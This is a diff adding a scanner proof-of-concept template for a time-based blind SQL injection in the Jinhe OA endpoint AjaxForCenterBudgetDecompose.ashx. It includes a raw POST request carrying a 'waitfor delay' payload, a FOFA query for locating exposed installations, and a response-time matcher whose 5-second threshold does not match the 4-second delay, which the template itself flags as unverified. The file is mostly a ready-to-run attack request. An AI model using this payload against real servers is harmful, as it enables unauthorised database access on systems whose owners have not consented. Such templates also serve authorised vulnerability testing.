@@ -1,0 +1,29 @@
+id: poc-by7h8ocsy32pqcm3
+info:
+  name: 金和OA AjaxForCenterBudgetDecompose.ashx 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/by7h8ocsy32pqcm3
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: by7h8ocsy32pqcm3
+    fofa: app="金和网络-金和OA"
+http:
+- raw:
+  - 'POST /c6/JHSoft.Web.CostControl/Decompose/AjaxForCenterBudgetDecompose.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    strType=getBudgetTime&strDeptId=1&strYear=2012&type=1''waitfor delay ''0:0:4''--&TimeType=1'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
